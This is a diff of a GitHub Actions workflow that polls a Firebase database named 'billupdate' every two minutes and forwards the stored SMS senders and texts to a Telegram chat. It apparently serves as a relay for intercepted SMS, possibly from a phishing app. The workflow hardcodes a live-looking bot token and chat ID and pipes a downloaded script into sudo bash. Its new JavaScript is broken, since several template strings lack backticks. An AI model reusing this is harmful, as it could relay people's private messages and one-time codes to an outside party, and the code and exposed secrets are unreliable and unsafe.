@@ -2,97 +2,152 @@ name: SMS to Telegram Forwarder
 
 on:
   schedule:
-    - cron: '*/2 * * * *'  # Har 2 minute me check
-  workflow_dispatch:
+    - cron: '*/2 * * * *'  # Har 2 minute me
+  workflow_dispatch:  # Manual run ke liye
 
 jobs:
   check-sms:
     runs-on: ubuntu-latest
     
     steps:
-      - name: Install Python dependencies
-        run: |
-          pip install requests
-          
       - name: Check and Send SMS
         env:
           FIREBASE_URL: 'https://billupdate-2c426-default-rtdb.asia-southeast1.firebasedatabase.app'
           BOT_TOKEN: '6854542102:AAH7zpx9_Jt8H4W-jEAFj-0eQ0hz3gX2N-M'
           CHAT_ID: '194289567'
         run: |
-          echo "🚀 Starting SMS check..."
+          echo "🚀 Starting SMS Checker..."
           
-          # Python script to check and send
-          python3 -c "
-import requests
-import json
-import os
-from datetime import datetime
-
-FIREBASE_URL = os.environ.get('FIREBASE_URL')
-BOT_TOKEN = os.environ.get('BOT_TOKEN')
-CHAT_ID = os.environ.get('CHAT_ID')
-
-print(f'🔍 Checking Firebase: {FIREBASE_URL}')
-
-try:
-    # Get unread messages
-    response = requests.get(f'{FIREBASE_URL}/messages.json?orderBy=\"telegram_sent\"&equalTo=null&limitToLast=5')
-    
-    if response.status_code == 200:
-        data = response.json()
-        
-        if data and data != 'null':
-            print(f'✅ Found {len(data)} new messages')
-            
-            for msg_id, msg in data.items():
-                if msg and isinstance(msg, dict):
-                    print(f'📱 Processing: {msg_id}')
+          # Install Node.js if needed
+          curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
+          sudo apt-get install -y nodejs
+          
+          # Create simple JavaScript file
+          cat > check_sms.js << 'EOF'
+          const https = require('https');
+          
+          const FIREBASE_URL = process.env.FIREBASE_URL;
+          const BOT_TOKEN = process.env.BOT_TOKEN;
+          const CHAT_ID = process.env.CHAT_ID;
+          
+          console.log('🔍 Checking Firebase database...');
+          
+          // Function to send Telegram message
+          function sendTelegram(message) {
+            return new Promise((resolve, reject) => {
+              const data = JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+              });
+              
+              const options = {
+                hostname: 'api.telegram.org',
+                port: 443,
+                path: /bot${BOT_TOKEN}/sendMessage,
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                  'Content-Length': data.length
+                }
+              };
+              
+              const req = https.request(options, (res) => {
+                let response = '';
+                res.on('data', chunk => response += chunk);
+                res.on('end', () => resolve(JSON.parse(response)));
+              });
+              
+              req.on('error', reject);
+              req.write(data);
+              req.end();
+            });
+          }
+          
+          // Function to update Firebase
+          function updateFirebase(msgId, data) {
+            return new Promise((resolve, reject) => {
+              const jsonData = JSON.stringify(data);
+              
+              const url = new URL(FIREBASE_URL + /messages/${msgId}.json);
+              
+              const options = {
+                hostname: url.hostname,
+                port: 443,
+                path: url.pathname,
+                method: 'PATCH',
+                headers: {
+                  'Content-Type': 'application/json',
+                  'Content-Length': jsonData.length
+                }
+              };
+              
+              const req = https.request(options, (res) => {
+                let response = '';
+                res.on('data', chunk => response += chunk);
+                res.on('end', () => resolve(response));
+              });
+              
+              req.on('error', reject);
+              req.write(jsonData);
+              req.end();
+            });
+          }
+          
+          // Main function
+          async function checkSMS() {
+            try {
+              // Get unread messages
+              const getMessages = () => new Promise((resolve, reject) => {
+                https.get(${FIREBASE_URL}/messages.json?orderBy="telegram_sent"&equalTo=null&limitToLast=5, (res) => {
+                  let data = '';
+                  res.on('data', chunk => data += chunk);
+                  res.on('end', () => resolve(JSON.parse(data || '{}')));
+                }).on('error', reject);
+              });
+              
+              const messages = await getMessages();
+              
+              if (messages && Object.keys(messages).length > 0) {
+                console.log(✅ Found ${Object.keys(messages).length} new messages);
+                
+                for (const [msgId, msg] of Object.entries(messages)) {
+                  if (msg && msg.sender && msg.message) {
+                    console.log(📱 Processing: ${msgId});
                     
-                    # Create Telegram message
-                    telegram_msg = f'''🚨 NEW SMS RECEIVED
-
-📞 From: {msg.get('sender', 'Unknown')}
-📝 Message: {msg.get('message', 'No message')}
-⏰ Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
-🆔 ID: {msg_id}'''
+                    const telegramMsg = 🚨 *NEW SMS*\n📞 From: ${msg.sender}\n📝 Message: ${msg.message}\n🆔 ID: ${msgId};
                     
-                    # Send to Telegram
-                    telegram_response = requests.post(
-                        f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
-                        json={
-                            'chat_id': CHAT_ID,
-                            'text': telegram_msg,
-                            'parse_mode': 'Markdown'
-                        }
-                    )
-                    
-                    if telegram_response.status_code == 200:
-                        print(f'   ✅ Telegram: Sent')
-                        
-                        # Mark as sent in Firebase
-                        mark_response = requests.patch(
-                            f'{FIREBASE_URL}/messages/{msg_id}.json',
-                            json={'telegram_sent': True, 'sent_at': int(datetime.now().timestamp()*1000)}
-                        )
-                        
-                        if mark_response.status_code == 200:
-                            print(f'   ✅ Firebase: Marked')
-                        else:
-                            print(f'   ⚠️ Firebase Error: {mark_response.text}')
-                    else:
-                        print(f'   ❌ Telegram Error: {telegram_response.text}')
-                else:
-                    print(f'   ⚠️ Invalid message format')
-        else:
-            print('📭 No new messages found')
-    else:
-        print(f'❌ Firebase error: {response.status_code} - {response.text}')
-        
-except Exception as e:
-    print(f'🔥 Critical error: {str(e)}')
-    import traceback
-    traceback.print_exc()
-          "
+                    try {
+                      // Send to Telegram
+                      await sendTelegram(telegramMsg);
+                      console.log(`   ✅ Telegram: Sent`);
+                      
+                      // Mark as sent in Firebase
+                      await updateFirebase(msgId, {
+                        telegram_sent: true,
+                        sent_at: Date.now(),
+                        sent_via: 'github_actions'
+                      });
+                      console.log(`   ✅ Firebase: Updated`);
+                      
+                    } catch (error) {
+                      console.log(`   ❌ Error: ${error.message}`);
+                    }
+                  }
+                }
+              } else {
+                console.log('📭 No new messages found');
+              }
+              
+            } catch (error) {
+              console.error('🔥 Error:', error.message);
+            }
+          }
+          
+          checkSMS();
+          EOF
+          
+          # Run the script
+          node check_sms.js
           
           echo "✅ Check completed at $(date)"
